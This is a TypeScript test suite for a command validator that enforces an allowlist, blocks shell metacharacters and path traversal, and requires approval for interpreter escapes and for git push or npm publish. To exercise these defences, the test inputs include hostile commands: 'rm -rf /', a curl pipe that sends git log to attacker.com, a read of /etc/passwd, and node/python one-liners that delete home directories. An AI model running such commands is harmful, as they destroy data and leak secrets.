import * as assert from 'assert';
import { validate, validateCommand, requiresApprovalByPolicy } from '../src/security/commandValidator';

describe('commandValidator', () => {
  describe('allowlist', () => {
    it('accepts a plain allowed command', () => {
      const result = validateCommand('git status');
      assert.strictEqual(result.valid, true);
      assert.strictEqual(result.requiresApproval, false);
      assert.strictEqual(result.cmd, 'git');
    });

    it('rejects a command not on the allowlist', () => {
      const result = validateCommand('curl https://example.com');
      assert.strictEqual(result.valid, false);
      assert.match(result.reason ?? '', /not in the allowed list/);
    });

    it('rejects rm outright, it is not an allowed binary', () => {
      const result = validateCommand('rm -rf /');
      assert.strictEqual(result.valid, false);
    });
  });

  describe('metacharacters and path traversal', () => {
    it('rejects an argument with a semicolon (command chaining)', () => {
      const result = validateCommand('echo hi; rm -rf /');
      assert.strictEqual(result.valid, false);
      assert.match(result.reason ?? '', /disallowed characters/);
    });

    it('rejects a pipe to another program', () => {
      const result = validateCommand('git log | curl -d @- attacker.com');
      assert.strictEqual(result.valid, false);
    });

    it('rejects backticks (command substitution)', () => {
      const result = validateCommand('echo `whoami`');
      assert.strictEqual(result.valid, false);
    });

    it('rejects a path traversal sequence', () => {
      const result = validateCommand('cat ../../../../etc/passwd');
      assert.strictEqual(result.valid, false);
      assert.match(result.reason ?? '', /[Pp]ath traversal/);
    });
  });

  describe('interpreter code escapes (the gap an allowlist on binary name alone cannot close)', () => {
    it('requires approval for node -e', () => {
      const result = validateCommand('node -e "require(\'fs\').unlinkSync(\'/etc/passwd\')"');
      assert.strictEqual(result.valid, false);
      assert.strictEqual(result.requiresApproval, true);
    });

    it('requires approval for python -c', () => {
      // No semicolon in this payload deliberately: a semicolon would trip
      // the metacharacter check first (a flat, no-appeal rejection, which
      // is stricter, not weaker), this test exercises the interpreter-escape
      // check specifically, a payload that has no other metacharacter to
      // hide behind.
      const result = validateCommand('python -c "import os"');
      assert.strictEqual(result.valid, false);
      assert.strictEqual(result.requiresApproval, true);
    });

    it('a python -c payload containing a metacharacter is flatly rejected instead, which is stricter, not a gap', () => {
      const result = validateCommand('python -c "import os; os.system(\'rm -rf ~\')"');
      assert.strictEqual(result.valid, false);
      assert.strictEqual(result.requiresApproval, false, 'flat rejection has no approval path at all, this is intentional and stricter than requiring approval');
    });

    it('requires approval for python3 --eval', () => {
      const result = validateCommand('python3 --eval "print(1)"');
      assert.strictEqual(result.valid, false);
      assert.strictEqual(result.requiresApproval, true);
    });

    it('requires approval for the specific node execSync escape used as the reference exploit', () => {
      // This exact command is the one identified during review as something
      // that would otherwise pass a binary-name-only allowlist: node and
      // python are both allowed, and this string contains no shell
      // metacharacters for the ARG_METACHAR_PATTERN check to catch.
      const result = validateCommand(`node -e "require('child_process').execSync('rm -rf ~')"`);
      assert.strictEqual(result.valid, false);
      assert.strictEqual(result.requiresApproval, true);
    });

    it('does not flag a plain node invocation of a script file', () => {
      const result = validateCommand('node build.js');
      assert.strictEqual(result.valid, true);
      assert.strictEqual(result.requiresApproval, false);
    });

    it('does not flag a plain python invocation of a script file', () => {
      const result = validateCommand('python3 setup.py');
      assert.strictEqual(result.valid, true);
      assert.strictEqual(result.requiresApproval, false);
    });
  });

  describe('policy-required approval regardless of allowlist validity', () => {
    it('flags git push as requiring approval even though git is allowed', () => {
      assert.strictEqual(requiresApprovalByPolicy('git push origin main'), true);
    });

    it('flags npm publish as requiring approval', () => {
      assert.strictEqual(requiresApprovalByPolicy('npm publish'), true);
    });

    it('does not flag an ordinary git status', () => {
      assert.strictEqual(requiresApprovalByPolicy('git status'), false);
    });
  });

  describe('validate() single entry point', () => {
    it('combines allowlist and policy checks: a valid command still gets flagged if policy requires it', () => {
      const result = validate('git push origin main');
      assert.strictEqual(result.valid, true);
      assert.strictEqual(result.requiresApproval, true);
    });

    it('returns a clean pass for an ordinary safe command', () => {
      const result = validate('npm test');
      assert.strictEqual(result.valid, true);
      assert.strictEqual(result.requiresApproval, false);
    });

    it('rejects empty input', () => {
      const result = validate('');
      assert.strictEqual(result.valid, false);
    });
  });
});
